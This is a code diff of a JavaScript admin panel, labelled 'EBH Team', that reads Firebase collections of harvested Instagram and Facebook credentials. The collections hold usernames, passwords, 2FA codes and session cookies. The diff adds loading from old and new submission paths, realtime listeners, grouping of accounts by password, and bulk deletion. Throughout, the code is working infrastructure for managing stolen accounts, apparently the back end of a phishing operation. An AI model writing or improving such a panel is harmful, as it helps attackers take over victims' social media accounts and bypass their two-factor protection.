@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>EBH Team - Admin Panel (Multi-Option Control)</title>
+<title>EBH Team - Admin Panel (Dual Path Support)</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -1042,7 +1042,7 @@ body {
 <div class="container">
   <div class="header">
     <h1><i class="fas fa-crown"></i> EBH ADMIN PANEL <i class="fas fa-shield-alt"></i></h1>
-    <div class="subtitle">Multi-Option Control • Password Grouped</div>
+    <div class="subtitle">Dual Path Support • Old + New Data</div>
   </div>
   
   <!-- Option Tabs -->
@@ -1058,7 +1058,7 @@ body {
     </button>
   </div>
   
-  <!-- Stats Card (Dynamic based on selected option) -->
+  <!-- Stats Card -->
   <div class="stats-card">
     <div class="stat">
       <span class="number" id="totalCount">0</span>
@@ -1098,7 +1098,7 @@ body {
         <i class="fas" id="optionIcon"></i> 
         <span id="optionTitle">INSTAGRAM 2FA ACCOUNTS</span>
       </h2>
-      <button class="refresh-btn" onclick="loadData()">
+      <button class="refresh-btn" onclick="refreshCurrentOption()">
         <i class="fas fa-sync-alt"></i> REFRESH
       </button>
     </div>
@@ -1136,7 +1136,7 @@ body {
     </div>
   </div>
 
-  <!-- Option Control Cards (3 separate controls) -->
+  <!-- Option Control Cards -->
   <div class="system-control-card">
     <div class="control-header">
       <i class="fas fa-toggle-on"></i>
@@ -1220,14 +1220,14 @@ body {
       </div>
     </div>
     
-    <!-- System Wide Messages (Ticker and Off Reason) -->
+    <!-- System Wide Messages -->
     <div class="system-messages">
       <!-- টিকার মেসেজ -->
       <div class="message-box" style="border-left: 4px solid var(--secondary);">
         <label style="color: var(--secondary);">
           <i class="fas fa-scroll"></i> টিকার মেসেজ (স্ক্রলিং এর জন্য)
         </label>
-        <textarea id="tickerMessage" placeholder="এখানে টিকারে দেখানোর মেসেজ লিখুন... এই লেখাটি সব সময় স্লাইড হবে"></textarea>
+        <textarea id="tickerMessage" placeholder="এখানে টিকারে দেখানোর মেসেজ লিখুন..."></textarea>
         <div class="message-actions">
           <button class="save-msg-btn" onclick="saveTickerMessage()" style="background: var(--secondary);">
             <i class="fas fa-save"></i> টিকার মেসেজ সেভ করুন
@@ -1244,7 +1244,7 @@ body {
         <label style="color: var(--danger);">
           <i class="fas fa-exclamation-triangle"></i> সিস্টেম বন্ধের কারণ (বড় নোটিশ)
         </label>
-        <textarea id="offReasonMessage" placeholder="এখানে সিস্টেম বন্ধ করার কারণ লিখুন... এই লেখাটি শুধু OFF অবস্থায় বড় করে দেখাবে"></textarea>
+        <textarea id="offReasonMessage" placeholder="এখানে সিস্টেম বন্ধ করার কারণ লিখুন..."></textarea>
         <div class="message-actions">
           <button class="save-msg-btn" onclick="saveOffReasonMessage()" style="background: var(--danger);">
             <i class="fas fa-save"></i> কারণ সেভ করুন
@@ -1259,7 +1259,7 @@ body {
   </div>
   
   <div class="footer">
-    <p>EBH TEAM • ADMIN PANEL • Multi-Option Control</p>
+    <p>EBH TEAM • ADMIN PANEL • Dual Path Support</p>
   </div>
 </div>
 
@@ -1364,9 +1364,14 @@ let groupedAccounts = {
 };
 let filteredGroups = [];
 
-let currentOption = 'instagram'; // Default
+let currentOption = 'instagram';
 let isSearching = false;
 let currentSearchTerm = "";
+
+// Firebase Listeners
+let instagramListener = null;
+let facebook2faListener = null;
+let facebookcookieListener = null;
 
 // Option Status Variables
 let optionStatus = {
@@ -1386,51 +1391,73 @@ let systemStatus = true;
 let tickerMessageText = "";
 let offReasonText = "";
 
-// Load All Data from Firebase
+// Load All Data
 function loadAllData() {
   loadSystemStatus();
   loadOptionStatus();
-  loadOptionData(currentOption);
+  setupRealtimeListener(currentOption);
 }
 
-// Load Option Data (Instagram/Facebook2FA/FacebookCookie)
-function loadOptionData(option) {
-  showLoading();
+// Load Data from Multiple Paths
+async function loadDataFromPaths(option) {
+  let newData = [];
+  let oldData = [];
   
-  let path = "";
-  if (option === 'instagram') path = "instagram_2fa_submissions";
-  else if (option === 'facebook2fa') path = "facebook_2fa_submissions";
-  else path = "facebook_cookie_submissions";
+  // Paths based on option
+  let newPath = `submissions/${option}`;
+  let oldPath = "";
   
-  db.ref(path).once("value")
-  .then(snapshot => {
-    allAccounts[option] = [];
-    
-    if (snapshot.exists()) {
-      const submissions = snapshot.val();
-      
+  if (option === 'instagram') {
+    oldPath = "instagram_2fa_submissions";
+  } else if (option === 'facebook2fa') {
+    oldPath = "facebook_2fa_submissions";
+  } else {
+    oldPath = "facebook_cookie_submissions";
+  }
+  
+  try {
+    // Load from new path (submissions/instagram etc.)
+    const newSnapshot = await db.ref(newPath).once('value');
+    if (newSnapshot.exists()) {
+      const submissions = newSnapshot.val();
       Object.keys(submissions).forEach(key => {
-        const submissionData = submissions[key];
-        
-        let username = submissionData.username || submissionData.uid || submissionData.user || 'N/A';
-        let password = submissionData.password || submissionData.pass || 'N/A';
-        let code = '';
-        
-        if (option === 'facebookcookie') {
-          code = submissionData.cookie || submissionData.cookies || submissionData.code || 'N/A';
-        } else {
-          code = submissionData.cookie_2fa || submissionData.twofa || submissionData.code || submissionData['2fa'] || 'N/A';
-        }
-        
-        if (username !== 'N/A' || password !== 'N/A' || code !== 'N/A') {
-          allAccounts[option].push({
-            username: username,
-            password: password,
-            code: code
-          });
-        }
+        const data = submissions[key];
+        newData.push({
+          username: data.id || data.username || data.uid || 'N/A',
+          password: data.password || 'N/A',
+          code: data.code || data.cookie || data.twofa || 'N/A'
+        });
       });
     }
+    
+    // Load from old path (instagram_2fa_submissions etc.)
+    const oldSnapshot = await db.ref(oldPath).once('value');
+    if (oldSnapshot.exists()) {
+      const submissions = oldSnapshot.val();
+      Object.keys(submissions).forEach(key => {
+        const data = submissions[key];
+        newData.push({
+          username: data.username || data.uid || data.user || data.id || 'N/A',
+          password: data.password || data.pass || 'N/A',
+          code: data.cookie_2fa || data.twofa || data.cookie || data.code || data['2fa'] || 'N/A'
+        });
+      });
+    }
+    
+  } catch (error) {
+    console.error("Error loading data:", error);
+  }
+  
+  return newData;
+}
+
+// Setup Realtime Listener
+function setupRealtimeListener(option) {
+  showLoading();
+  
+  // Load data from both paths
+  loadDataFromPaths(option).then(data => {
+    allAccounts[option] = data;
     
     // Remove duplicates
     allAccounts[option] = allAccounts[option].filter((account, index, self) =>
@@ -1450,25 +1477,74 @@ function loadOptionData(option) {
     updateUIBasedOnOption();
     renderAccountsTable(filteredGroups);
     updateStats();
-  })
-  .catch(err => {
-    accountsContainer.innerHTML = `
-      <div class="table-container">
-        <div class="no-data" style="color: #ed4956;">
-          <td colspan="4" class="no-data-cell">
-            <i class="fas fa-exclamation-triangle" style="font-size: 2.5rem; margin-bottom: 10px;"></i>
-            <p>Error: ${err.message}</p>
-          </td>
-        </div>
-      </div>
-    `;
+    
+    // Update last update time
+    const now = new Date();
+    const timeStr = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+    lastUpdate.textContent = `${timeStr}`;
   });
+  
+  // Also setup realtime listener for new path only
+  let newPath = `submissions/${option}`;
+  
+  // Remove old listener if exists
+  if (option === 'instagram' && instagramListener) {
+    db.ref(newPath).off('value', instagramListener);
+  } else if (option === 'facebook2fa' && facebook2faListener) {
+    db.ref(newPath).off('value', facebook2faListener);
+  } else if (option === 'facebookcookie' && facebookcookieListener) {
+    db.ref(newPath).off('value', facebookcookieListener);
+  }
+  
+  const listener = db.ref(newPath).on('value', () => {
+    // When new data arrives, reload all data
+    loadDataFromPaths(option).then(data => {
+      allAccounts[option] = data;
+      
+      allAccounts[option] = allAccounts[option].filter((account, index, self) =>
+        index === self.findIndex(a => 
+          a.username === account.username && 
+          a.password === account.password && 
+          a.code === account.code
+        )
+      );
+      
+      groupedAccounts[option] = groupAccountsByPassword(allAccounts[option]);
+      
+      if (!isSearching) {
+        filteredGroups = [...groupedAccounts[option]];
+      } else {
+        // Re-apply search
+        searchData(false);
+      }
+      
+      renderAccountsTable(filteredGroups);
+      updateStats();
+      
+      const now = new Date();
+      const timeStr = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+      lastUpdate.textContent = `${timeStr}`;
+    });
+  });
+  
+  // Store listener
+  if (option === 'instagram') {
+    instagramListener = listener;
+  } else if (option === 'facebook2fa') {
+    facebook2faListener = listener;
+  } else {
+    facebookcookieListener = listener;
+  }
+}
+
+// Refresh current option
+function refreshCurrentOption() {
+  setupRealtimeListener(currentOption);
 }
 
 // Load System Status
 function loadSystemStatus() {
-  db.ref("system_control").once("value")
-  .then(snapshot => {
+  db.ref("system_control").on("value", (snapshot) => {
     if (snapshot.exists()) {
       const data = snapshot.val();
       systemStatus = data.status !== undefined ? data.status : true;
@@ -1485,8 +1561,7 @@ function loadSystemStatus() {
 
 // Load Option Status
 function loadOptionStatus() {
-  db.ref("option_control").once("value")
-  .then(snapshot => {
+  db.ref("option_control").on("value", (snapshot) => {
     if (snapshot.exists()) {
       const data = snapshot.val();
       
@@ -1556,7 +1631,6 @@ function toggleOptionStatus(option) {
   
   updateOptionSwitch(option, optionStatus[option]);
   
-  // Save to Firebase
   db.ref(`option_control/${option}`).update({
     status: optionStatus[option],
     message: optionMessages[option] || ""
@@ -1671,9 +1745,10 @@ function saveOffReasonMessage() {
 
 // Switch Option
 function switchOption(option) {
+  if (option === currentOption) return;
+  
   currentOption = option;
   
-  // Update tabs
   optionTabs.forEach(tab => {
     if (tab.dataset.option === option) {
       tab.classList.add('active');
@@ -1682,23 +1757,20 @@ function switchOption(option) {
     }
   });
   
-  // Update UI based on option
   updateUIBasedOnOption();
   
-  // Clear search
   isSearching = false;
   currentSearchTerm = "";
   searchInput.value = "";
   searchResultCard.style.display = 'none';
   
-  // Load data for this option
-  loadOptionData(option);
+  setupRealtimeListener(option);
 }
 
 // Update UI based on selected option
 function updateUIBasedOnOption() {
   if (currentOption === 'instagram') {
-    optionIcon.className = 'fas fab fa-instagram';
+    optionIcon.className = 'fab fa-instagram';
     optionTitle.textContent = 'INSTAGRAM 2FA ACCOUNTS';
     copyUserLabel.textContent = 'USER';
     copyCodeLabel.textContent = '2FA';
@@ -1708,7 +1780,7 @@ function updateUIBasedOnOption() {
     deleteModalOption.textContent = 'INSTAGRAM';
     deleteModalOptionName.textContent = 'INSTAGRAM 2FA';
   } else if (currentOption === 'facebook2fa') {
-    optionIcon.className = 'fas fab fa-facebook';
+    optionIcon.className = 'fab fa-facebook';
     optionTitle.textContent = 'FACEBOOK 2FA ACCOUNTS';
     copyUserLabel.textContent = 'UID';
     copyCodeLabel.textContent = '2FA';
@@ -1784,10 +1856,6 @@ function updateStats() {
   
   countDisplay.textContent = `${isSearching ? searchResults : total} accounts in ${isSearching ? filteredGroups.length : groups} groups`;
   deleteCount.textContent = total;
-  
-  const now = new Date();
-  const timeStr = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
-  lastUpdate.textContent = `${timeStr}`;
 }
 
 // Render accounts table
@@ -1870,11 +1938,17 @@ function renderAccountsTable(groups) {
 }
 
 // Search data
-function searchData() {
+function searchData(shouldLoad = true) {
   const searchTerm = searchInput.value.trim().toLowerCase();
   
   if (!searchTerm) {
-    loadOptionData(currentOption);
+    if (shouldLoad) {
+      isSearching = false;
+      currentSearchTerm = "";
+      filteredGroups = [...groupedAccounts[currentOption]];
+      renderAccountsTable(filteredGroups);
+      updateStats();
+    }
     return;
   }
   
@@ -2002,12 +2076,18 @@ function deleteOptionData() {
     </div>
   `;
   
-  let path = "";
-  if (currentOption === 'instagram') path = "instagram_2fa_submissions";
-  else if (currentOption === 'facebook2fa') path = "facebook_2fa_submissions";
-  else path = "facebook_cookie_submissions";
+  let paths = [];
+  if (currentOption === 'instagram') {
+    paths = ["instagram_2fa_submissions", "submissions/instagram"];
+  } else if (currentOption === 'facebook2fa') {
+    paths = ["facebook_2fa_submissions", "submissions/facebook2fa"];
+  } else {
+    paths = ["facebook_cookie_submissions", "submissions/facebookcookie"];
+  }
   
-  db.ref(path).remove()
+  const deletePromises = paths.map(path => db.ref(path).remove());
+  
+  Promise.all(deletePromises)
   .then(() => {
     allAccounts[currentOption] = [];
     groupedAccounts[currentOption] = [];
@@ -2015,23 +2095,14 @@ function deleteOptionData() {
     isSearching = false;
     currentSearchTerm = "";
     searchResultCard.style.display = 'none';
+    searchInput.value = "";
     
-    accountsContainer.innerHTML = `
-      <div class="table-container">
-        <div class="no-data" style="color: #10b981;">
-          <td colspan="4" class="no-data-cell">
-            <i class="fas fa-check-circle" style="font-size: 2.5rem; margin-bottom: 10px;"></i>
-            <p>All ${currentOption} data deleted successfully!</p>
-          </td>
-        </div>
-      </div>
-    `;
-    
+    renderAccountsTable([]);
     updateStats();
   })
   .catch(err => {
     alert("Delete failed: " + err.message);
-    loadOptionData(currentOption);
+    setupRealtimeListener(currentOption);
   });
 }
 
@@ -2050,7 +2121,12 @@ searchInput.addEventListener("keyup", function(e) {
 
 searchInput.addEventListener("input", function() {
   if (this.value.trim() === "" && isSearching) {
-    loadOptionData(currentOption);
+    isSearching = false;
+    currentSearchTerm = "";
+    filteredGroups = [...groupedAccounts[currentOption]];
+    renderAccountsTable(filteredGroups);
+    updateStats();
+    searchResultCard.style.display = 'none';
   }
 });
 
@@ -2058,7 +2134,6 @@ searchInput.addEventListener("input", function() {
 document.addEventListener('DOMContentLoaded', function() {
   updateUIBasedOnOption();
   loadAllData();
-  setInterval(() => loadOptionData(currentOption), 60000); // Auto refresh every minute
 });
 </script>
 
